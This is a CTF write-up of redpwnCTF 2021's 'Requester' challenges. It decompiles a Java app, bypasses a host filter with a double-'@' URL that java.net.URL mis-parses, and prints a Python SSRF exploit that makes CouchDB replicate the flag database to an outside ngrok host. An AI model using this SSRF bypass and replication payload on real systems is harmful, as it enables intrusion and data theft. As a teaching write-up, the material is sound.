# redpwnCTF 2021: Requester + Requester Strikes Back

[redpwnCTF 2021](https://ctf.redpwn.net/) is the 3rd edition of a cybersecurity competition hosted by the [redpwn CTF team](https://ctftime.org/team/59759), with some very creative challenges.

I found an unintented solution here (and I wasn't the only one). And I'll mention the intented solution later.

![Logo](img/logo.png)

## Follow me

If you want to follow the solution, run the redpwn challenge with docker compose :) (Just found it)

* https://github.com/redpwn/redpwnctf-2021-challenges/tree/master/web/requester

## Challenge: Requester

We have a simple Java App, which tests if a provided API works fine, returning a valid JSON Object.

![Front End](img/front-end.png)

To make a simple test, I use a random testing endpoint from typicode: https://my-json-server.typicode.com/typicode/demo/db

```bash
$ curl https://my-json-server.typicode.com/typicode/demo/db
{
  "posts": [
    {
      "id": 1,
      "title": "Post 1"
    },
    {
      "id": 2,
      "title": "Post 2"
    },
    {
      "id": 3,
      "title": "Post 3"
    }
  ],
  "comments": [
    {
      "id": 1,
      "body": "some comment",
      "postId": 1
    },
    {
      "id": 2,
      "body": "some comment",
      "postId": 1
    }
  ],
  "profile": {
    "name": "typicode"
  }
}
```

Submiting this URL returns a **success**. If I submit some non-JSON URL (e.g https://ctf.redpwn.net/), it returns an error: **Something went wrong**.

There's also a note:

>Note: I ran out of time to make a complete frontend sorry :(((

But we have a lot to work on.

## Binary - JAR File

We are given a jar file (requester.jar) to work with. Luckily for us, the Java bytecode is very easily decompiled to human-readable Java code. I used the classic [JD (Java Decompiler)](http://java-decompiler.github.io/) tool to analyze the target.

![JD](img/JD.png)

We have some packages with a lot of code inside, but most of them are required libraries packaged togheter with the main app. It's clear here that the main app package is **net.redpwn**.

Let's deep dive the app to understand it better. I'll ignore the imports to keep it small ~~and because Java is hatefully verbose~~

## Class Main

```java
public class Main {
  public static Database db;
  
  public static String flag;
  
  public static void main(String[] args) {
    String adminUser = System.getenv("adminUser");
    String adminPassword = System.getenv("adminPassword");
    flag = System.getenv("flag");
    String javalinEnv = System.getenv("javalinEnv");
    db = new Database(adminUser, adminPassword);
    db.initializeDatabase();
    JavalinJte.configure(createTemplateEngine(javalinEnv));
    Javalin app = Javalin.create().start(8080);
    app.get("/", ctx -> ctx.render("index.jte"));
    app.get("/createUser", Handlers::createUser);
    app.get("/testAPI", Handlers::testAPI);
  }
  
  // ... Useless bulshit (for challenge solving purposes)
}
```

### Summary

- Gets a username and password for the Database class (we'll get there)
- Gets the flag (AHA!) from env and does nothing with it.
- Initialize the Database
- Initializes 3 endpoints:
  - **/** the frontend static page
  - **/createUser** Interesting.. let's look at it later
  - **/testAPI** the test from the main app page, used in the start

OK, the **Handlers** class handles the requests. But let's take a look first on the Database class

## Class Database

It's kind of a verbose class ~~like everything made in Java~~, so let's break it into smaller blocks.

```java
private final String adminUsername;
private final String adminPassword;

public Database(String adminUsername, String adminPassword) {
    this.adminUsername = adminUsername;
    this.adminPassword = adminPassword;
}

private String getDbString() {
    return "http://" + this.adminUsername + ":" + this.adminPassword + "@couchdb:5984/";
}

private boolean validateAlphanumeric(String name) {
    return name.matches("^[a-zA-Z0-9_]*$");
}
```

### Summary
- Stores the admin username and password received from the Main class.
- getDbString returns an HTTP URL string to connect to a couchdb database - now we know what this credentials means.
- The database is on the **couchdb** host.
- A validation function used for usernames (see more below).

NEXT!

```java
public void createDatabase(String name) throws Exception {
    if (name.length() > 16 || !validateAlphanumeric(name))
      throw new Exception("Illegal name"); 
    JSONObject res = HttpClient.putAPI(getDbString() + getDbString(), "");
    if (!res.has("ok") || !res.getBoolean("ok"))
      throw new Exception("Database creation failed"); 
  }
  
  public void initializeDatabase() {
    try {
      createDatabase("_replicator");
    } catch (Exception e) {
      Utils.logException(e);
      System.out.println("Replicator already initialized");
    } 
    try {
      createDatabase("_users");
    } catch (Exception e) {
      Utils.logException(e);
      System.out.println("Users already initialized");
    } 
    try {
      createDatabase("log");
    } catch (Exception e) {
      Utils.logException(e);
      System.out.println("Log already initialized");
    } 
}
```

### Summary
- A function to create a couchdb Database, by sending an HTTP PUT to the couch server.
- Create 3 default databases: _replicator, _users and log.

Boring. What else you got?

To avoid the ~~Java~~ boredom, I'll summarize some parts from here.

```Java
public void createUser(String name, String password) throws Exception {
    if (name.length() > 16 || !validateAlphanumeric(name))
      throw new Exception("Illegal name"); 
    if (password.length() > 16 || !validateAlphanumeric(password))
      throw new Exception("Illegal password"); 
    // ... boring java stuff
    JSONObject res = HttpClient.putAPI(getDbString() + "_users/org.couchdb.user:" + getDbString(), userObj.toString());
    // ... boring java stuff
  }

public void addUserToDatabase(String dbName, String username) throws Exception {
    if (dbName.length() > 16 || !validateAlphanumeric(dbName))
      throw new Exception("Illegal dbname"); 
    if (username.length() > 16 || !validateAlphanumeric(username))
      throw new Exception("Illegal username"); 
   // ... boring java stuff
    JSONObject res = HttpClient.putAPI(getDbString() + getDbString() + "/_security", configObj.toString());
    // ... boring java stuff
  }

  public void insertDocumentToDatabase(String dbName, String document) throws Exception {
    // ... boring java stuff
    JSONObject res = HttpClient.postAPI(getDbString() + getDbString(), document);
    // ... boring java stuff
  }
```

### Summary
- Creates the user and inserts the user in the database, making the proper validations.
- A function to insert a new document in the database

**Now you have something here. The new user created by you is added as admin of the new couch database. Keep that in your heart for now. MOVE IT!**

Now that we got some foundations, let's look at the Handlers class.

## Class Handlers

```Java
public static void createUser(Context ctx) {
    // ... a lot of boring stuff deleted
    Main.db.createDatabase(username);
    Main.db.createUser(username, password);
    Main.db.addUserToDatabase(username, username);
    flagDoc.put("flag", Main.flag);
    Main.db.insertDocumentToDatabase(username, flagDoc.toString());
  }
```

### Summary
- Calls all the DB functions to Create DB, Create User and Add user to the new DB.
- **INSERT THE FLAG IN YOUR DATABASE**

Right, now we know that when you create a new user, it creates a database with the same name and inserts the flag there.
We have to think on how to exfiltrate this data.

Let's look at the "last" function and work from there (can't... look...more... Javaaaaa..).

```Java
public static void testAPI(Context ctx) {
    String url = (String)ctx.queryParam("url", String.class).get();
    String method = (String)ctx.queryParam("method", String.class).get();
    String data = ctx.queryParam("data");
    try {
      URL urlURI = new URL(url);
      if (urlURI.getHost().contains("couchdb"))
        throw new ForbiddenResponse("Illegal!"); 
    } catch (MalformedURLException e) {
      throw new BadRequestResponse("Input URL is malformed");
    } 
    try {
      if (method.equals("GET")) {
        JSONObject jsonObj = HttpClient.getAPI(url);
        String str = jsonObj.toString();
      } else if (method.equals("POST")) {
        JSONObject jsonObj = HttpClient.postAPI(url, data);
        String stringJsonObj = jsonObj.toString();
        if (Utils.containsFlag(stringJsonObj))
          throw new ForbiddenResponse("Illegal!"); 
      } else {
        throw new BadRequestResponse("Request method is not accepted");
      } 
    } catch (Exception e) {
      throw new InternalServerErrorResponse("Something went wrong");
    } 
    ctx.result("success");
  }
```

### Summary
- This is the testAPI function called by the user interface.
- Receive the Test URL in the "url" parameter (daaah).
- Receive the "method" (GET or POST) and "data" for POST.
- Parse the URL using the java.net.URL package.
- If the URL Host contains the string "couchdb", return an error (Illegal!).
- If the URL is invalid, return an error (Malformed).
- If the request is a GET, perform a GET Request without the data param.
- If the request is a POST, perform a POST Request, using the data param.
- If the resulting data contains the flag, returns an error (making me very angry).
- In case of any exception, return a generic error.
- After all this shit, it does not return the information to the client... just a "success" message.

![The Twins](img/matrix_twins.jpg)

We didn't talk about the Utils and HTTPClient class. The Utils is... useless for our analysis. The HTTPClient is a wrapper that uses the org.apache.http package to make the actual requests. It just format the requests.

I tought I would need to analyze this class in more detail but... no (just a bit).

## Couch Surfing

We got to get to the couch but... it blocks us. Fortunately, I've read this incredible [Black Hat article](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf), from the [Orange Tsai](https://twitter.com/orange_8361) group.

Off course I won't explain the entire article here ~~you lazy script kiddie~~, but basically, URL parsing is not easy as it sounds, and different implementations understands it differently.

![Orange](img/orange_tsai_url_parsing_example.png)
Source: Same article above

In fact, "@" and ":" delimits username and password, just like when accessing the CouchDB:

```bash
$ curl http://admin:password@couchdb:5984/_all_dbs
["_replicator","_users","somedb","log"]
```

Let's wake up the thing. In my case, I'll not run via docker, because I already have the setup from the challenge days.

```bash
$ java -jar requester.jar 

#... ignoring some errors here, because my couchdb already have the default databases created

Log already initialized
[main] INFO io.javalin.Javalin - 
           __                      __ _
          / /____ _ _   __ ____ _ / /(_)____
     __  / // __ `/| | / // __ `// // // __ \
    / /_/ // /_/ / | |/ // /_/ // // // / / /
    \____/ \__,_/  |___/ \__,_//_//_//_/ /_/

        https://javalin.io/documentation

[main] INFO org.eclipse.jetty.util.log - Logging initialized @2879ms to org.eclipse.jetty.util.log.Slf4jLog
[main] INFO io.javalin.Javalin - Starting Javalin ...
[main] INFO io.javalin.Javalin - Listening on http://localhost:8080/
[main] INFO io.javalin.Javalin - Javalin started in 195ms \o/
```

Ok! It's 8080 locally.

So let's check if I was telling the true at the beggining of the story but looking details in the shell. 

```bash
curl localhost:8080/testAPI?url=https://my-json-server.typicode.com/typicode/demo/db\&method=GET

success
```

And checking a non-JSON site: 

```bash
$ curl localhost:8080/testAPI?url=https://ctf.redpwn.net/\&method=GET

Something went wrong
```

If you look at the server output:

```Java
org.json.JSONException: A JSONObject text must begin with '{' at 1 [character 2 line 1]
	at org.json.JSONTokener.syntaxError(JSONTokener.java:507)
	at org.json.JSONObject.<init>(JSONObject.java:222)
	at org.json.JSONObject.<init>(JSONObject.java:406)
	at net.redpwn.HttpClient.getAPI(HttpClient.java:68)
	at net.redpwn.Handlers.testAPI(Handlers.java:50)
	at io.javalin.core.security.SecurityUtil.noopAccessManager(SecurityUtil.kt:23)
	at io.javalin.http.JavalinServlet$addHandler$protectedHandler$1.handle(JavalinServlet.kt:128)
	at io.javalin.http.JavalinServlet$service$2$1.invoke(JavalinServlet.kt:45)
// ... Java giant boring stack lines
	at org.eclipse.jetty.util.thread.QueuedThreadPool$Runner.run(QueuedThreadPool.java:1036)
	at java.base/java.lang.Thread.run(Thread.java:832)
```

We already knew it would happen by the code analysis. But.. what about the couchdb filter. Does it really works?

```bash
$ curl localhost:8080/testAPI?url=https://couchdb:5984/\&method=GET

Illegal!
```

Ok... the filter works. But... let's test what the Orange team told us.

![The Twins](img/the_oracle_cookies.jpg)

First of all, let's create our user and related database (and also check it in the local couchdb lab instance):

```bash
# Creating user
 curl http://localhost:8080/createUser?username=neptunian\&password=neptunian

success

# Listing "neptunian" database documents, using our credentials (jq formats our JSON output)
$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs | jq
{
  "total_rows": 1,
  "offset": 0,
  "rows": [
    {
      "id": "99ea668366ac9d5d74fd2bc91c00ed5b",
      "key": "99ea668366ac9d5d74fd2bc91c00ed5b",
      "value": {
        "rev": "1-cee1919fc2eda9a6068ed2792608a9dd"
      }
    }
  ]
}

# Check details of document id 99ea668366ac9d5d74fd2bc91c00ed5b
$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00ed5b | jq
{
  "_id": "99ea668366ac9d5d74fd2bc91c00ed5b",
  "_rev": "1-cee1919fc2eda9a6068ed2792608a9dd",
  "flag": "flag{fake}"
}
```

(Fake) flag created as expected inside our database, with our sent credentials... We ONLY need to steal it from the target requester app.

After playing sometime with URL interpretation, look what I found:

```bash
# URL http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian
$ curl -vv http://localhost:8080/testAPI?method=GET\&url=http://neptunian:neptunian\@couchdb\:5984\@couchdb\:5984/neptunian
*   Trying 127.0.0.1:8080...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET /testAPI?method=GET&url=http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sun, 25 Jul 2021 13:57:27 GMT
< Server: Javalin
< Content-Type: text/plain
< Content-Length: 7
< 
* Connection #0 to host localhost left intact

success
```

We didn't hit the Illegal filter! I'll come back to the reason later, but now we have a limited CTF time to get the points.

We are not sure we hit the couchdb server, so let's try inserting a document. To avoid problems with bash string escaping, let's move to Python, testing the POST options of the testAPI.

```python
import requests
import json

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
}

# Simple POST Test
params = (
    ('url', 'http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian'),
    ('method', 'POST'),
    ('data', 
        json.dumps({
            "some_int": 1,
            "some_string": "c"
        })
    )
)

# Local
response = requests.get('http://localhost:8080/testAPI', headers=headers, params=params) 

print(response.text)
```

Fire in the hole!

```bash
# Send the payload
$ python exploit.py 

success

# Check new documents
$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs | jq
{
  "total_rows": 2,
  "offset": 0,
  "rows": [
    {
      "id": "99ea668366ac9d5d74fd2bc91c00ed5b",
      "key": "99ea668366ac9d5d74fd2bc91c00ed5b",
      "value": {
        "rev": "1-cee1919fc2eda9a6068ed2792608a9dd"
      }
    },
    {
      "id": "99ea668366ac9d5d74fd2bc91c00fd09",
      "key": "99ea668366ac9d5d74fd2bc91c00fd09",
      "value": {
        "rev": "1-f8744c7d9e172ac4b188fbb8f337a204"
      }
    }
  ]
}

# There is a new ID 99ea668366ac9d5d74fd2bc91c00fd09!

$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00fd09 | jq
{
  "_id": "99ea668366ac9d5d74fd2bc91c00fd09",
  "_rev": "1-f8744c7d9e172ac4b188fbb8f337a204",
  "some_int": 1,
  "some_string": "c"
}
```

It lives!

We successfully bypassed the URL filter and we are able to play with our couch database. We got into the door but... we still can't exfiltrate information from there.

## Rescuing the Keymaker

![keymaker](img/rescuing_the_keymaker.jpeg)

While searching for some couchdb webhook, I've found very a simple solution: couchdb replication: https://docs.couchdb.org/en/3.1.1/replication/replicator.html.

Since we already have the _replicator database in place, this is quite simple. You just have to POST into _replicate endpoint, a JSON with a source and destination:

```JSON
{
    "source": "source_db_name",
    "target": "http://dest_user:dest_password@destination_host/dest_database"
}
```

Let's put our local couchdb available on the internet, using our forever friend: ngrok.

```
ngrok by @inconshreveable                                                                                                     (Ctrl+C to quit)
                                                                                                                                              
Session Status                online                                                                                                          
Account                       me@mydomain.com (Plan: Free [pay a full account you cheap bastard!])                                                                         
Version                       2.3.40                                                                                                          
Region                        United States (us)                                                                                              
Web Interface                 http://127.0.0.1:4040                                                                                           
Forwarding                    http://2d0a4710580a.ngrok.io -> http://localhost:5984                                                           
Forwarding                    https://2d0a4710580a.ngrok.io -> http://localhost:5984                                                          
                                                                                                                                              
Connections                   ttl     opn     rt1     rt5     p50     p90                                                                     
                              0       0       0.00    0.00    0.00    0.00
```

Let's use temporary URL https://2d0a4710580a.ngrok.io as destination database.

We need to first create the database in the destination, to receive the replicated documents.

```bash
$ curl -X PUT https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag
{"ok":true}
```

Let's configure our exploit to use the remote db.

```JSON
{
    "source": "neptunian",
    "target": "https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag"
}
```

Let's prepare for the final battle.

```python
import requests
import json

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
}

# POST Replication (Local)
params = (
    ('url', 'http://neptunian:neptunian@couchdb:5984@couchdb:5984/_replicate'),
    ('method', 'POST'),
    ('data', 
        json.dumps({
            "source": "neptunian",
            "target": "https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag"
        })
    )
)

response = requests.get('http://localhost:8080/testAPI', headers=headers, params=params) 

print(response.text)
```

### Release The Kraken!!

```bash
$ python exploit.py 

success
```

And checking our local destination DB for the good news.

```bash
$ curl -s http://tempadm:tempadm12@couchdb:5984/neptunian_flag/_all_docs | jq
# Checking all DB documents - There are 2 new!
{
  "total_rows": 2,
  "offset": 0,
  "rows": [
    {
      "id": "99ea668366ac9d5d74fd2bc91c00ed5b",
      "key": "99ea668366ac9d5d74fd2bc91c00ed5b",
      "value": {
        "rev": "1-cee1919fc2eda9a6068ed2792608a9dd"
      }
    },
    {
      "id": "99ea668366ac9d5d74fd2bc91c00fd09",
      "key": "99ea668366ac9d5d74fd2bc91c00fd09",
      "value": {
        "rev": "1-f8744c7d9e172ac4b188fbb8f337a204"
      }
    }
  ]
}

# Owned!
$ curl -s http://tempadm:tempadm12@couchdb:5984/neptunian_flag/99ea668366ac9d5d74fd2bc91c00ed5b | jq
{
  "_id": "99ea668366ac9d5d74fd2bc91c00ed5b",
  "_rev": "1-cee1919fc2eda9a6068ed2792608a9dd",
  "flag": "flag{fake}"
}
```

And, in the day of the challenge:

```bash
$ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/_all_docs | jq
{
  "total_rows": 1,
  "offset": 0,
  "rows": [
    {
      "id": "d139bf6ab1733d779f64e9c6c4026de9",
      "key": "d139bf6ab1733d779f64e9c6c4026de9",
      "value": {
        "rev": "1-4bb8f6dafef84b2d856fe1444f38b0a2"
      }
    }
  ]
}

$ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c4026de9 | jq
{
  "_id": "d139bf6ab1733d779f64e9c6c4026de9",
  "_rev": "1-4bb8f6dafef84b2d856fe1444f38b0a2",
  "flag": "flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}"
}
```

I do not agree with the flag! :)
```
{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}"
```

## Requester Strikes back

A second version of the requester challenge was released later and the same exploit worked without changes (just created a new database).

I'll get to this later.

```bash
$ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb2/_all_docs | jq
{
  "total_rows": 1,
  "offset": 0,
  "rows": [
    {
      "id": "6f5ec542ba093d37d82aec3cf20103bc",
      "key": "6f5ec542ba093d37d82aec3cf20103bc",
      "value": {
        "rev": "1-3b34cc91306c84767621f84a7a4b0cd8"
      }
    }
  ]
}

$ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb2/6f5ec542ba093d37d82aec3cf20103bc | jq
{
  "_id": "6f5ec542ba093d37d82aec3cf20103bc",
  "_rev": "1-3b34cc91306c84767621f84a7a4b0cd8",
  "flag": "flag{TYp0_InsTEad_0F_JAvA_uRl_M4dN3ss_92643}"
}
```

```
{TYp0_InsTEad_0F_JAvA_uRl_M4dN3ss_92643}"
```

## URL Madness

To understand more about what happened to the URL validation, let's create a small ~~(small and java?)~~ Java program using only the validation code.

```java
import java.net.URL;
import java.net.MalformedURLException;

public class ValidateURL {

  public static void main(String[] args) {
    String url = args[0];
    System.out.println("Input: '" + url + "'");
    try {
      URL urlURI = new URL(url);
      String urlHost = urlURI.getHost();
      System.out.println("====> How java.net.URL understood it:");
      System.out.println("Host: '" + urlHost + "'");
      System.out.println("Protocol: '" + urlURI.getProtocol() + "'");
      System.out.println("Authority: '" + urlURI.getAuthority() + "'");
      System.out.println("Path: '" + urlURI.getPath() + "'");
      System.out.println("Port: '" + Integer.toString(urlURI.getPort()) + "'");
      System.out.println("Query: '" + urlURI.getQuery() + "'");
      System.out.println("Ref/Anchor: '" + urlURI.getRef() + "'");
      System.out.println("User Info: '" + urlURI.getUserInfo() + "'");
      
      if (urlURI.getHost().contains("couchdb"))
        System.out.println("Illegal!"); 
    } catch (MalformedURLException e) {
      System.out.println("Input URL is malformed");
    } 
  }
}
```

(I feel the dirty in my hands after writing it).

Let's check what the hell it understood from our URL.

```bash
# Compile
$ javac ValidateURL.java 

# Test the simple blocked URL
$ java ValidateURL http://couchdb:5984/_all_docs
Input: 'http://couchdb:5984/_all_docs'
====> How java.net.URL understood it:
Host: 'couchdb'
Protocol: 'http'
Authority: 'couchdb:5984'
Path: '/_all_docs'
Port: '5984'
Query: 'null'
Ref/Anchor: 'null'
User Info: 'null'
Illegal!

# Test the bypassing URL... what the hell is that?
$ java ValidateURL http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian
Input: 'http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian'
====> How java.net.URL understood it:
Host: ''
Protocol: 'http'
Authority: 'neptunian:neptunian@couchdb:5984@couchdb:5984'
Path: '/neptunian'
Port: '-1'
Query: 'null'
Ref/Anchor: 'null'
User Info: 'null'
```

java.net.URL has a bug when extracting the host part of a fake URL like that (with 2 '@'), making the Host component being null, bypassing the Host validation.

If you just take a look at the OpenJDK implementation of URL parsing, you'll see a giant string parsing battle (I believe in you Orange Tsai).

http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/net/URLStreamHandler.java
http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/tip/src/share/classes/java/net/URL.java

(A discord user named "maple3142" supposed this might be the bug: https://github.com/apache/httpcomponents-client/commit/e628b4c5c464c2fa346385596cc78e035a91a62e)

The "bug is still working" on my AWS JDK 15:

```
$ java -version
openjdk version "15.0.1" 2020-10-20
OpenJDK Runtime Environment Corretto-15.0.1.9.1 (build 15.0.1+9)
OpenJDK 64-Bit Server VM Corretto-15.0.1.9.1 (build 15.0.1+9, mixed mode, sharing)
```

I just don't feel motivated enough right now to debug the exact code bug (it would be fun but... we have families to take care!).

But... since the validation is buggy, why the actual POSTs are working fine?
It turns out, it's using the **org.apache.http** package to make the requests, as told in the start, and it does not seem to be affected by the same bug.

The redpwn HttpClient class also transforms our URL user and password in an authorization header, but it works just fine with our poisonous URL.

## The intended solution(s)

![TheArchitect](img/matrix_architect.jpeg)

After the CTF ended, I checked solutions of other teams on the discord channels.

### URL Bypass

It turns out, the first URL bypass was much simpler than my solution. Since the URL validation is case-sensitive, I could just mix uppercases (like "CouchDB") to bypass (dumb Neptunian overcomplicating things!).

The "Requester Strikes Back" solves this by translating everything to lowercase:

```java
if (urlURI.getHost().toLowerCase().contains("couchdb"))
        throw new ForbiddenResponse("Illegal!"); 
```

To bypass the Strikes Back, we use the URL madness, as hinted by the flag text.

### Flag Exfiltration

It looks like the intended solution here was not the replication, but a Blind NoSQL injection, searching the flag char by char. 
Pretty nice!

I saw someone in Discord (I remember being an organizer) saying that the replication could be the intended solution if he knew it, meaning the blind NoSQL was the planned one. But I could not locate the message anymore).

# Overall Feeling

Great CTF with some very creative challenges! (Mostly harder than my average poor solutions).

There was an awesome Discord bot challenge. If I had some six more months, I could have solved it. I swear!

# References

* CTF Time Event: https://ctftime.org/event/1327
* redpwnCTF: https://ctf.redpwn.net/
* redpwn CTF team: https://ctftime.org/team/59759
* A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!: https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
* CouchDB Replication: https://docs.couchdb.org/en/3.1.1/replication/replicator.html
* Repo with the artifacts discussed here: https://github.com/Neptunians/redpwnctf-2021
* Team: [FireShell](https://fireshellsecurity.team/)
* Team Twitter: [@fireshellst](https://twitter.com/fireshellst)
* Follow me too :) [@NeptunianHacks](twitter.com/NeptunianHacks)

